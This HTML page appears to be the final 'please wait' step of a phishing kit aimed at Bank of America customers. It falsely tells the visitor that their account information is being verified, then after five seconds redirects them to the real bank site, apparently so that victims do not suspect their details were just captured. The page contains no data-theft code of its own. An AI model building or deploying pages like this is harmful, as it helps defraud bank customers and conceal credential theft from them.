<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Please Wait</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Refresh" content="5; url=https://www.bankofamerica.com/">

<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

</head>
<body>
<div id="text1" style="position:absolute; overflow:hidden; left:296px; top:227px; width:571px; height:39px; z-index:1">
<div class="wpmd">
<div><font class="ws11">Verifying Your Account information </font></div>
<div><font class="ws11">Please wait .</font></div>
</div></div>

<div id="image2" style="position:absolute; overflow:hidden; left:342px; top:280px; width:257px; height:23px; z-index:2"><img src="images/status_indicator_alone.gif" alt="" title="" border=0 width=257 height=23></div>


<img src="images/03.png" width="252" height="36">
</body>
</html>
